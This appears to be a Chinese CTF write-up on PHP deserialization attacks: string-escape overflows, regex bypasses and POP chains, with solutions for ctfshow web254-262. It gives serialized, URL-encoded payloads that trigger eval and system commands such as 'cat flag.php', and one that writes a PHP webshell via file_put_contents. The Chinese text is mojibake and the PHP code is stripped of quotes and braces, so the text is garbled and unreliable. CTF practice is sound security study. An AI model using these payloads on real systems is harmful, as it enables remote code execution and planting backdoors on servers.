echo You cant do it!; è¿™é‡Œæ£€æµ‹äº†æ˜¯å¦åŒ…å« flag å­—ç¬¦, æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ flag çš„åå…­è¿›åˆ¶ \\66\\6c\\61\\67 æ¥ç»•è¿‡, æ„é€ ä»¥ä¸‹: O:4:Read:1:s:4:name;S:4:\\66\\6c\\61\\67; åˆ©ç”¨å¥½å¼•ç”¨å¯¹äºéœ€è¦åˆ¤æ–­ä¸¤ä¸ªå˜é‡æ˜¯å¦ç›¸ç­‰æ—¶, æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨å¼•ç”¨æ¥è®©ä¸¤ä¸ªå˜é‡å§‹ç»ˆç›¸ç­‰. è¿™ä¸ªç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆä¸€æ ·, ä»£ç å¦‚ä¸‹: class A public $a; public $b;$a = new A();$a-a = $a-b;echo serialize($a); åºåˆ—åŒ–åçš„ç»“æœä¸º: O:1:A:2:s:1:a;N;s:1:b;R:2; å¯¹è±¡ååºåˆ—åŒ–æ­£åˆ™ç»•è¿‡æœ‰äº›æ—¶å€™æˆ‘ä»¬ä¼šçœ‹åˆ°^O:\\d+ è¿™ç§çš„æ­£åˆ™è¡¨è¾¾å¼, è¦æ±‚å¼€å¤´ä¸èƒ½ä¸ºå¯¹è±¡ååºåˆ—åŒ– è¿™ç§æƒ…å†µæˆ‘ä»¬æœ‰ä»¥ä¸‹ç»•è¿‡æ‰‹æ®µ ç”±äº\\dåªåˆ¤æ–­äº†æ˜¯å¦ä¸ºæ•°å­—, åˆ™å¯ä»¥åœ¨ä¸ªæ•°å‰æ·»åŠ +å·æ¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ å°†è¿™ä¸ªå¯¹è±¡åµŒå¥—åœ¨å…¶ä»–ç±»å‹çš„ååºåˆ—åŒ–ä¹‹ä¸­, ä¾‹å¦‚æ•°ç»„ å½“ç„¶, ç¬¬ä¸€ç§æ›´ä½³. å› ä¸ºè‹¥ä¸åªåŒ¹é…å¼€å¤´åˆ™ä»å¯ä»¥ç»•è¿‡ å­—ç¬¦é€ƒé€¸å¯¹äºå­—ç¬¦é€ƒé€¸, ç”±äº PHP åºåˆ—åŒ–åçš„å­—ç¬¦ç±»å‹ä¸­çš„å¼•å·ä¸ä¼šè¢«è½¬ä¹‰, å¯¹äºå­—ç¬¦ä¸²æœ«å°¾é æä¾›çš„å­—ç¬¦æ•°é‡æ¥è¯»å–, å¯¹äºæœåŠ¡ç«¯ä¸Šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²å®é™…é•¿åº¦è¿›è¡Œå¢åŠ æˆ–å‡å°‘(ä¾‹å¦‚æ›¿æ¢æŒ‡å®šå­—ç¬¦åˆ°æ›´é•¿çŸ­çš„å­—ç¬¦), æˆ‘ä»¬å°±å¯ä»¥å°†å…¶æº¢å‡ºå¹¶æˆ‘ä»¬çš„æ¶æ„å­—ç¬¦ä¸²ååºåˆ—åŒ–. ç”±çŸ­å˜é•¿?phpclass Book public $id = 114514; public $name = Kengwang å­¦ä¹ ç¬”è®°; // å¯æ§ public $path = Kengwang å­¦ä¹ ç¬”è®°.md;function filter($str) return str_replace(, \\\\, $str);$exampleBook = new Book();echo [å¤„ç†å‰]br ;$ser = serialize($exampleBook);echo $ser . br ;echo [å¤„ç†å]br ;$ser = filter($ser);echo $ser . br ;echo [æ–‡ä»¶è·¯å¾„] br ;$exampleBook = unserialize($ser);echo $exampleBook-path . br ; è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬é€šå¸¸åªèƒ½æ§åˆ¶å…¶ä¸­çš„ä¸€ä¸ªå­—ç¬¦å˜é‡, è€Œä¸æ˜¯æ•´ä¸ªååºåˆ—è¯å­—ç¬¦ä¸². é¢˜ç›®ä¼šå°†å…¶å…ˆåºåˆ—åŒ–, å†è¿›è¡Œå­—ç¬¦å¤„ç†, ä¹‹åå†ååºåˆ—åŒ–(ç±»ä¼¼äºå°†å¯¹è±¡å­˜å‚¨åˆ°æ•°æ®åº“) æ­¤ä»£ç ä¼šå°†å…¶ä¸­çš„å•å¼•å·è¿‡æ»¤æˆä¸ºè½¬ä¹‰+å•å¼•å·, æ­¤æ—¶å­—ç¬¦ä¸²çš„é•¿åº¦ä¼šè¿›è¡Œå˜åŒ–, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ä½¿ name ä¸­çš„ä¸œè¥¿æº¢å‡ºåˆ° path ä¸­. æˆ‘ä»¬æ„é€ æ¶æ„å­—ç¬¦ä¸²æ—¶éœ€è¦å…ˆå°†å‰é¢çš„åŒå¼•å·é—­åˆ,åŒæ—¶åˆ†å·è¡¨ç¤ºæ­¤å˜é‡ç»“æŸ. åœ¨æ”»å‡»å˜é‡ç»“æŸä¹‹åæˆ‘ä»¬éœ€è¦ç”¨ ; ç»“æŸå½“å‰çš„åºåˆ—åŒ–, ä¼šè‡ªåŠ¨å¿½ç•¥æ‰è¿™ä¹‹åçš„åºåˆ—åŒ– æˆ‘ä»¬çš„æ¯ä¸€ä¸ªå•å¼•å·ä¼šå˜æˆä¸¤ä¸ªå­—ç¬¦, äºæ˜¯å¯ä»¥å°†æˆ‘ä»¬çš„æ¶æ„å­—ç¬¦ç»™é¡¶æ‰, æˆ‘ä»¬åªéœ€è¦æä¾›æ¶æ„å­—ç¬¦ä¸²é•¿åº¦ä¸ªä¼šè¢«æ”¾å¤§å˜æˆä¸¤å€çš„å­—ç¬¦. å½“ç„¶å¦‚æœä¸æ˜¯ä¸¤å€, æˆ‘ä»¬å¯ä»¥çµæ´»è¿ç”¨ + æ¥è¿›è¡Œå€æ•°é…é½ ä¾‹å¦‚æˆ‘ä»¬éœ€è¦æ¶æ„æ„é€  ;s:4:path;s:4:flag;s:4:fake;s:34:, é•¿åº¦ä¸º 41, äºæ˜¯æˆ‘ä»¬æä¾› 41 ä¸ªï¼Œæœ€ç»ˆç»™ name çš„èµ‹å€¼ä¸º Kengwang çš„å­¦ä¹ ç¬”è®°;s:4:path;s:4:flag;s:4:fake;s:34: è¿è¡Œç»“æœå¦‚ä¸‹ï¼š [å¤„ç†å‰]O:4:Book:3:s:2:id;i:114514;s:4:name;s:106:Kengwang çš„å­¦ä¹ ç¬”è®°;s:4:path;s:4:flag;s:4:fake;s:34:;s:4:path;s:27:Kengwang çš„å­¦ä¹ ç¬”è®°.md;[å¤„ç†å]O:4:Book:3:s:2:id;i:114514;s:4:name;s:106:Kengwang çš„å­¦ä¹ ç¬”è®°\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\;s:4:path;s:4:flag;s:4:fake;s:34:;s:4:path;s:27:Kengwang çš„å­¦ä¹ ç¬”è®°.md;[æ–‡ä»¶è·¯å¾„]flag å¯ä»¥çœ‹åˆ° path è¢«æ›¿æ¢æˆäº† flag ç”±é•¿å˜çŸ­?phpclass Book public $id = 1919810; public $name = Kengwang çš„å­¦ä¹ ç¬”è®°; // å¯æ§ public $description = The WORST Web Security Leaning Note; // å¯æ§ public $path = Kengwang çš„å­¦ä¹ ç¬”è®°.md;function filter($str) return str_replace(, , $str);$exampleBook = new Book();echo [å¤„ç†å‰] ;$ser = serialize($exampleBook);echo $ser . ;echo [å¤„ç†å] ;$ser = filter($ser);echo $ser . ;echo [æ–‡ä»¶è·¯å¾„] ;$exampleBook = unserialize($ser);echo $exampleBook-path . ; æ­£å¸¸åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼š O:4:Book:4:s:2:id;i:114514;s:4:name;s:24:Kengwang çš„å­¦ä¹ ç¬”è®°;s:11:description;s:35:The WORST Web Security Leaning Note;s:4:path;s:27:Kengwang çš„å­¦ä¹ ç¬”è®°.md; æˆ‘ä»¬éœ€è¦è®© ;s:11:description;s:35: è¢«åæ‰ä½œä¸º name å˜é‡çš„å€¼, descriptionçš„å‰å¼•å·ä¼šå°†å…¶é—­åˆ, æ­¤å description ä¸­çš„å°±ä¼šé€ƒé€¸å‡ºæˆä¸ºååºåˆ—åŒ–ä¸², äºæ˜¯æˆ‘ä»¬åœ¨ name ä¸­å¡«å…¥ è¦è¢«åæ‰çš„å­—ç¬¦æ•°ç›® ä¸ª, äºæ˜¯å°è¯• å°† name èµ‹å€¼ä¸º Kengwang Note å°† description èµ‹å€¼ä¸º ;s:4:path;s:4:flag;s:11:description;s:0:;s:0: å¾—åˆ°ç»“æœå¦‚ä¸‹ [å¤„ç†å‰]O:4:Book:4:s:2:id;i:114514;s:4:name;s:39:Kengwang Note;s:11:description;s:55:;s:4:path;s:4:flag;s:11:description;s:0:;s:0:;s:4:path;s:27:Kengwang çš„å­¦ä¹  ç¬”è®°.md;[å¤„ç†å]O:4:Book:4:s:2:id;i:114514;s:4:name;s:39:Kengwang Note;s:11:description;s:55:;s:4:path;s:4:flag;s:11:description;s:0:;s:0:;s:4:path;s:27:Kengwang çš„å­¦ä¹ ç¬”è®°.md;[æ–‡ä»¶è·¯å¾„]flag POPé“¾æ„é€ åšè¿™ç§é¢˜å…³é”®æ˜¯phpé­”æœ¯æ–¹æ³•ï¼Œæ„é€ POPå…ˆæ‰¾åˆ°å¤´éƒ¨å’Œå°¾éƒ¨ï¼Œå¤´éƒ¨å°±æ˜¯ç”¨æˆ·å¯æ§çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ä¼ å…¥å‚æ•°çš„åœ°æ–¹ï¼Œç„¶åæ‰¾å°¾éƒ¨ï¼Œæ¯”å¦‚å…³é”®ä»£ç ï¼Œeval,file_put_contentsè¿™ç§ï¼Œç„¶åä»å°¾éƒ¨å¼€å§‹æ¨å¯¼ï¼Œæ ¹æ®é­”æœ¯æ–¹æ³•çš„ç‰¹æ€§ï¼Œä¸€æ­¥ä¸€æ­¥å¾€ä¸Šè§¦å‘ éš¾çš„æ˜¯è¦æ‰¾å‡ºè¿™æ¡é“¾ï¼Œç›´æ¥ä¸Šå®ä¾‹æ¥ç†è§£ [SWPUCTF 2021 æ–°ç”Ÿèµ›]pop?phperror_reporting(0);show_source(index.php);class w44m private $admin = aaa; protected $passwd = 123456; public function Getflag() if($this-admin === w44m $this-passwd ===08067) include(flag.php); echo $flag; else echo $this-admin; echo $this-passwd; echo nono; class w22m public $w00m; public function __destruct() echo $this-w00m; class w33m public $w00m; public $w22m; public function __toString() $this-w00m-$this-w22m(); return 0; $w00m = $_GET[w00m];unserialize($w00m); POPé“¾å…¥æ‰‹ï¼Œå…ˆæ‰¾å…³é”®ä»£ç ï¼Œç„¶åæ¨æ–­ éœ€è¦adminä¸ºw44mï¼Œpasswdä¸º08067 æ‰èƒ½å¾—åˆ°flag if($this-admin â€˜w44mâ€™ $this-passwd â€™08067â€™){ echo $flag; å‘ç°å¯ä»¥åˆ©ç”¨$this-w00m-{$this-w22m}(); è¿™ä¸ªåœ°æ–¹ï¼Œä¿®æ”¹w22mgetflagï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å°±æœ‰getflag()å‡½æ•°äº† åœ¨ç±»w22mä¸­ æ–¹æ³•__destructä¸­echo $this-w00m;echoäº†ä¸€ä¸ªå¯¹è±¡ï¼Œä¼šè§¦å‘tostringæ–¹æ³• å‰é¢é­”æœ¯æ–¹æ³•æåˆ° __toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚è¿™æ ·çš„è¯æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨to_Stingæ–¹æ³•é‡Œé¢çš„ä»£ç äº†ï¼Œä¼ å‚ç‚¹æ˜¯w00mï¼Œ é“¾å­æ„é€ ä¸º w22m::__destruct-w33m::toString-w44m::getflag pocå¦‚ä¸‹ï¼Œè¿™é‡Œè¦ç”¨urlencodeï¼Œå› ä¸ºæˆ‘ä»¬å‰é¢æåˆ°privateå’Œprotectedç”Ÿäº§åºåˆ—åŒ–æœ‰ä¸å¯è§å­—ç¬¦ ?php class w44m private $admin = w44m; protected $passwd = 08067; class w22m public $w00m; public function __destruct() echo $this-w00m; class w33m public $w00m=; public $w22m=getflag; public function __toString() $this-w00m-$this-w22m(); return 1; $a=new w22m(); $a-w00m=new w33m(); $a-w00m-w00m=new w44m(); echo urlencode( serialize($a)); CTFshowweb254?php error_reporting(0);highlight_file(__FILE__);include(flag.php);class ctfShowUser public $username=xxxxxx; public $password=xxxxxx; public $isVip=false; public function checkVip() return $this-isVip; public function login($u,$p) if($this-username===$u$this-password===$p) $this-isVip=true; return $this-isVip; public function vipOneKeyGetFlag() if($this-isVip) global $flag; echo your flag is .$flag; else echo no vip, no flag; $username=$_GET[username];$password=$_GET[password];if(isset($username) isset($password)) $user = new ctfShowUser(); if($user-login($username,$password)) if($user-checkVip()) $user-vipOneKeyGetFlag(); else echo no vip,no flag; è¿™é“é¢˜å¹¶æ²¡æœ‰è€ƒåˆ°ååºåˆ—åŒ–çš„ç›¸å…³çŸ¥è¯†ç‚¹ï¼Œè€Œæ˜¯è€ƒä½ é˜…è¯»ä»£ç çš„èƒ½åŠ›ï¼Œè¿™é¢˜çš„å¾—åˆ°flagçš„å‰ææ˜¯getä¼ å‚è¿›æ¥çš„usernameå’Œpasswordè¦å’Œç±»ä¸­ä¸€å¼€å§‹å®šä¹‰çš„å€¼ä¸€æ · æ‰€ä»¥æˆ‘ä»¬getä¼ å‚ï¼š?username=xxxxxxpassword=xxxxxx å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ web255?phperror_reporting(0);highlight_file(__FILE__);include(flag.php);class ctfShowUser public $username=xxxxxx; public $password=xxxxxx; public $isVip=false; public function checkVip() return $this-isVip; public function login($u,$p) return $this-username===$u$this-password===$p; public function vipOneKeyGetFlag() if($this-isVip) global $flag; echo your flag is .$flag; else echo no vip, no flag; $username=$_GET[username];$password=$_GET[password];if(isset($username) isset($password)) $user = unserialize($_COOKIE[user]); if($user-login($username,$password)) if($user-checkVip()) $user-vipOneKeyGetFlag(); else echo no vip,no flag; è¿™é“é¢˜å¼€å§‹ç®€å•çš„ååºåˆ—åŒ–äº†ï¼Œè¿™æ¬¡ç±»ä¸­çš„å‡½æ•°loginä¸ä¼šåœ¨æ”¹å˜$isVipçš„å€¼ï¼Œè€Œæ˜¯å•çº¯åœ°ç”¨ä½œåˆ¤æ–­ è§‚å¯Ÿä¸‹é¢çš„ä»£ç é€»è¾‘ï¼Œé¦–å…ˆè¦getä¼ å‚è¿›ä¸¤ä¸ªå˜é‡usernameå’Œpasswordçš„å€¼ï¼Œç„¶åè¦è®©è¿™ä¸¤ä¸ªå€¼çš„ç­‰äºåŸæœ¬ç±»ä¸­çš„å€¼ï¼Œæˆç«‹äº†ä¹‹åä¼šåˆ¤æ–­å‡½æ•°checkVip()çš„å¸ƒå°”å€¼è¦ä¸ºtrueï¼Œç¬¦åˆè¦æ±‚åæ‰ä¼šå¾—åˆ°flag å› ä¸ºé¢˜ç›®ä¸­æœ‰ååºåˆ—åŒ–çš„æ­¥éª¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±æ„é€ åºåˆ—åŒ–çš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š ?phperror_reporting(0);highlight_file(__FILE__);include(flag.php);class ctfShowUser public $username=root; public $password=root; public $isVip=true;$a = new ctfShowUser();echo urlencode(serialize($a)); å¾—åˆ°ç¼–ç åçš„åºåˆ—åŒ–ä¸ºï¼šO%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22root%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D å›åˆ°é¢˜ç›®ç¯å¢ƒï¼Œgetä¼ å‚ï¼š?username=rootpassword=rootï¼Œç„¶ååœ¨hackbarä¸­çš„cookieå¤„å†™å…¥ï¼šuser=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22root%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D å‘é€ï¼Œå¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ web256?phperror_reporting(0);highlight_file(__FILE__);include(flag.php);class ctfShowUser public $username=xxxxxx; public $password=xxxxxx; public $isVip=false; public function checkVip() return $this-isVip; public function login($u,$p) return $this-username===$u$this-password===$p; public function vipOneKeyGetFlag() if($this-isVip) global $flag; if($this-username!==$this-password) echo your flag is .$flag; else echo no vip, no flag; $username=$_GET[username];$password=$_GET[password];if(isset($username) isset($password)) $user = unserialize($_COOKIE[user]); if($user-login($username,$password)) if($user-checkVip()) $user-vipOneKeyGetFlag(); else echo no vip,no flag; è¿™é“é¢˜å’Œä¸Šé¢ä¸€é“é¢˜çš„åŒºåˆ«åœ¨äºusernameçš„å€¼å’Œpasswordçš„å€¼è¦ä¸ä¸€æ ·ï¼Œæ”¹ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œåºåˆ—åŒ–åçš„å€¼å¦‚ä¸‹ï¼š O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22root%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22flag%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ web257?phperror_reporting(0);highlight_file(__FILE__);class private $username=xxxxxx; private $password=xxxxxx; private $isVip=false; private $class = info; public function __construct() $this-class=new info(); public function login($u,$p) return $this-username===$u$this-password===$p; public function __destruct() $this-class-getInfo(); class info private $user=xxxxxx; public function getInfo() return $this-user; class backDoor private $code; public function getInfo() eval($this-code); $username=$_GET[username];$password=$_GET[password];if(isset($username) isset($password)) $user = unserialize($_COOKIE[user]); $user-login($username,$password); è¿™é¢˜éš¾åº¦åŠ å¤§äº†ä¸€ç‚¹ï¼Œæˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹æºç  ç±»ctfShowUserçš„__construct()æ–¹æ³•ä¸­ä¼šåˆå§‹åŒ–ä¸€ä¸ªç±»infoï¼Œèµ‹ç»™$classï¼Œ__destruct()æ–¹æ³•ä¼šè°ƒç”¨$classå¯¹è±¡ä¸­çš„å‡½æ•°getInfo æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç±»infoä¸­çš„getInfoå‡½æ•°ä¸­å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿ï¼Œåè€Œæ˜¯å¦ä¸€ä¸ªç±»backDoorä¸­çš„åŒåå‡½æ•°ï¼Œé‡Œé¢æœ‰å±é™©å‡½æ•°evalï¼Œå¯ä»¥å°†å…¶ä¸­çš„ä»»æ„å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œè¿™é¢˜ä¸­çš„æ˜¯$this-codeï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡å®ƒè¿›è¡Œrce æ‰€ä»¥ç»¼ä¸Šæˆ‘ä»¬åœ¨ç±»ctfShowUserçš„__construct()æ–¹æ³•ä¸­åº”è¯¥åˆå§‹åŒ–ç±»backDoor getä¼ å‚ï¼š?username=xxxxxxpassword=xxxxxx æˆ‘ä»¬æ„é€ çš„åºåˆ—åŒ–ä»£ç å¦‚ä¸‹ï¼š ?phpclass ctfShowUser private $username=xxxxxx; private $password=xxxxxx; private $isVip=false; private $class = info; public function __construct() $this-class=new backDoor(); class backDoor private $code=system(ls);; public function getInfo() eval($this-code); $a = new ctfShowUser();echo urlencode(serialize($a)); å¾—åˆ°çš„åºåˆ—åŒ–ç¼–ç ä¸ºï¼š O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D é¡µé¢å›æ˜¾ï¼šflag.phpï¼Œindex.php æ”¹ä¸€ä¸‹å¤–éƒ¨å‘½ä»¤ä¸ºï¼šcat flag.phpï¼Œåºåˆ—åŒ–åç¼–ç å¦‚ä¸‹ï¼š O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ web258?phperror_reporting(0);highlight_file(__FILE__);class ctfShowUser public $username=xxxxxx; public $password=xxxxxx; public $isVip=false; public $class = info; public function __construct() $this-class=new info(); public function login($u,$p) return $this-username===$u$this-password===$p; public function __destruct() $this-class-getInfo(); class info public $user=xxxxxx; public function getInfo() return $this-user; class backDoor public $code; public function getInfo() eval($this-code); $username=$_GET[username];$password=$_GET[password];if(isset($username) isset($password)) if(!preg_match(/[oc]:\\d+:/i, $_COOKIE[user])) $user = unserialize($_COOKIE[user]); $user-login($username,$password); è¿™é¢˜ä¸ä¸Šé¢˜ä¸ä¸€æ ·çš„åœ°æ–¹å°±æ˜¯å¤šäº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œè¿™ä¸ªæ­£åˆ™çš„ä½œç”¨æ˜¯æ£€æŸ¥ $_COOKIE[user] çš„å€¼æ˜¯å¦åŒ¹é…ä»¥ä¸‹æ¨¡å¼ï¼š ä»¥å­—ç¬¦ o æˆ– c å¼€å¤´ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œ åè·Ÿä¸€ä¸ªå†’å· :, ç„¶åæ˜¯ä¸€æˆ–å¤šä¸ªæ•°å­—ï¼Œ å†åè·Ÿä¸€ä¸ªå†’å· : å¾ˆæ˜æ˜¾ï¼Œè¿™åŒ¹é…çš„å°±æ˜¯å¯¹è±¡åºåˆ—åŒ–åçš„å¼€å¤´éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€äº›æ‰‹æ®µç»•è¿‡è¿™ä¸ªæ­£åˆ™åŒ¹é…ï¼Œå°±æ˜¯åœ¨æ•°å­—å‰é¢åŠ ä¸ªåŠ å·æ¥ç»•è¿‡ è¿™æ¬¡å´ä¸èƒ½å¤Ÿç”¨ä¹‹å‰çš„è„šæœ¬æ¥è¿è¡Œï¼Œå› ä¸ºå¯¹è±¡å±æ€§ä¸ºprivateçš„è¯å¯èƒ½ä¼šå‡ºç°ä¸€äº›æœªçŸ¥çš„é”™è¯¯ï¼ˆåšè¿™é¢˜çš„æ—¶å€™è¢«å¡åœ¨è¿™è¾¹æœ‰ä¸€æ®µæ—¶é—´ï¼‰ï¼Œæ‰€ä»¥å¯¹è±¡å±æ€§æœ€å¥½éƒ½ä¸ºpublic è„šæœ¬å¦‚ä¸‹ï¼š ?phpclass ctfShowUser public $username=xxxxxx; public $password=xxxxxx; public $isVip=true; public $class = backDoor; public function __construct() $this-class=new backDoor(); class backDoor public $code=system(ls);; public function getInfo() eval($this-code); $a = new ctfShowUser();echo urlencode(serialize($a)); å¾—åˆ°å¦‚ä¸‹ï¼š O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D urlè§£ç ååœ¨ç›¸å…³æ•°å­—å‰é¢åŠ ä¸ŠåŠ å·ï¼šO:+11:ctfShowUser:4:s:8:username;s:6:xxxxxx;s:8:password;s:6:xxxxxx;s:5:isVip;b:1;s:5:class;O:+8:backDoor:1:s:4:code;s:13:system(ls);; å†æ¬¡ç¼–ç å¹¶ä½¿ç”¨ï¼Œå¾—åˆ°è¯¥ç›®å½•ä¸‹å­˜åœ¨flag.php å°†å¤–éƒ¨å‘½ä»¤æ¢æˆcat flag.phpï¼Œå¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ web259ï¼ˆcsrf)flag.phpçš„ä»£ç å¦‚ä¸‹ï¼š $xff = explode(,, $_SERVER[HTTP_X_FORWARDED_FOR]);array_pop($xff);$ip = array_pop($xff);if($ip!==127.0.0.1)\tdie(error);else\t$token = $_POST[token];\tif($token==ctfshow) file_put_contents(flag.txt,$flag); ç¯å¢ƒä»£ç å¦‚ä¸‹ï¼š ?phphighlight_file(__FILE__);$vip = unserialize($_GET[vip]);//vip can get flag one key$vip-getFlag(); é¢˜ç›®é¢˜è§£å‚è€ƒï¼šhttps://blog.csdn.net/qq_45694932/article/details/120498828 éœ€è¦è¡¥å……çš„æ˜¯ï¼Œè¿™é“é¢˜è¦ä½¿ç”¨çš„SoapClient æ˜¯ PHP ä¸­è‡ªå¸¦çš„ä¸€ä¸ªç±»ï¼Œç”¨äºå®ç° SOAPï¼ˆSimple Object Access Protocolï¼‰å®¢æˆ·ç«¯åŠŸèƒ½ã€‚SOAP æ˜¯ä¸€ç§åŸºäº XML çš„åè®®ï¼Œç”¨äºåœ¨è®¡ç®—æœºç½‘ç»œä¸Šä¼ è¾“æ¶ˆæ¯ã€‚SoapClient ç±»æä¾›äº†ä¸ SOAP æœåŠ¡å™¨è¿›è¡Œé€šä¿¡çš„æ–¹æ³•ï¼Œä½¿å¾— PHP ç¨‹åºå¯ä»¥æ–¹ä¾¿åœ°è°ƒç”¨åŸºäº SOAP çš„ Web æœåŠ¡ ä½†æ˜¯è‡ªå·±ä¸‹è½½ä¸‹æ¥çš„phpå¯èƒ½å¹¶æ²¡æœ‰å¯åŠ¨è¯¥æ‰©å±•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ°é…ç½®æ–‡ä»¶php.iniä¸­æœç´¢extension=soap å¦‚æœå‰é¢æœ‰åˆ†å·å°±ä»£è¡¨å¹¶æ²¡æœ‰å¯ç”¨ï¼Œè¦å¯ç”¨çš„è¯å°±æ˜¯ç›´æ¥åˆ å»åˆ†å·å°±æˆåŠŸå¯ç”¨äº† web260?phperror_reporting(0);highlight_file(__FILE__);include(flag.php);if(preg_match(/ctfshow_i_love_36D/,serialize($_GET[ctfshow]))) echo $flag; ä»£ç é€»è¾‘å¾ˆç®€å•ï¼Œåºåˆ—åŒ–ä¹Ÿä¸ä¼šå½±å“å­—ç¬¦ä¸² æ‰€ä»¥ç›´æ¥getä¼ å‚ï¼š?ctfshow=ctfshow_i_love_36D å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ web261?phphighlight_file(__FILE__);class ctfshowvip public $username; public $password; public $code; public function __construct($u,$p) $this-username=$u; $this-password=$p; public function __wakeup() if($this-username!= || $this-password!=) die(error); public function __invoke() eval($this-code); public function __sleep() $this-username=; $this-password=; public function __unserialize($data) $this-username=$data[username]; $this-password=$data[password]; $this-code = $this-username.$this-password; public function __destruct() if($this-code==0x36d) file_put_contents($this-username, $this-password); unserialize($_GET[vip]); å½“ç±»ä¸­åŒæ—¶å­˜åœ¨__unserialize()å’Œ__wakeup()æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨__unserilize()æ–¹æ³•è€Œä¸è°ƒç”¨å¦ä¸€ä¸ªæ–¹æ³• ç„¶å__invoke()ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œä¸ç”¨å»è°ƒç”¨ 0x36då¯¹åº”çš„æ˜¯877,å¹¶ä¸”æ˜¯å¼±æ¯”è¾ƒï¼Œåªè¦å‰é¢æ˜¯877å°±è¡Œï¼Œåé¢æ¥ä»€ä¹ˆéƒ½å¯ä»¥ åˆ©ç”¨file_put_contentsæ¥å†™å…¥æœ¨é©¬æ–‡ä»¶ ç»¼ä¸Šï¼Œè„šæœ¬å¦‚ä¸‹ï¼š ?phpclass ctfshowvip public $username; public $password; public function __construct($u,$p) $this-username=$u; $this-password=$p; $a = new ctfshowvip(877.php,?php eval($_POST[shell]) ?);echo urlencode(serialize($a)); getä¼ å‚ï¼š?vip=O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A30%3A%22%3C%3Fphp+eval%28%24_POST%5B%22shell%22%5D%29+%3F%3E%22%3B%7D æ–‡ä»¶æˆåŠŸå†™å…¥ï¼Œç”¨èšå‰‘ç›´è¿ å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ web262?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 02:37:19# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# 